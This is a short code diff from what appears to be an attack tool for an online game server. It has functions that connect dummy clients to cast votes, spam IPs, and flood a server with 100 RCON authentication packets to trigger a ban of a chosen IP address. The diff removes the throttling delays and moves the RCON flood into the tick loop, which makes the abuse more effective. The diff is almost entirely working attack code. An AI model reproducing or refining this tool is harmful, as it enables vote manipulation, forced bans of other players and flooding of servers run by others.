@@ -303,7 +303,6 @@ void ConnectDummies(const char *IP, int Port, int Amount, int Vote)
 			BufferSize = PackVote(&buffer[0], j, Vote);
 			SendData((const char*)buffer, BufferSize, j);
 		}
-		Sleep(15);
 	}
 }
 
@@ -379,16 +378,7 @@ void RconBan(const char *SrvIP, int Port, const char *BanIP)
 	BufferSize = PackEnterGame(&buffer[0], 0);
 	SendData((const char*)buffer, BufferSize, 0);
 
-	Sleep(100); // short delay right here
-
-	// send the rcon auth's
-	int i;
-	for(i = 0; i < 100; i++)
-	{
-		ZeroMemory(buffer, 2048);
-		BufferSize = PackRconAuth(&buffer[0], 0);
-		SendData((const char*)buffer, BufferSize, 0);
-	}
+	m_SendRcon = true;
 }
 
 void SpamIPs(const char *IP, int Port)
@@ -413,6 +403,19 @@ void Tick()
 			ZeroMemory(buffer, 2048);
 			BufferSize = PackKeepAlive(&buffer[0], i);
 			SendData((const char*)buffer, BufferSize, i);
+		}
+
+		if(m_SendRcon)
+		{
+			// send the rcon auth's
+			int i;
+			for(i = 0; i < 100; i++)
+			{
+				ZeroMemory(buffer, 2048);
+				BufferSize = PackRconAuth(&buffer[0], 0);
+				SendData((const char*)buffer, BufferSize, 0);
+				m_SendRcon = false;
+			}
 		}
 	}
 	else
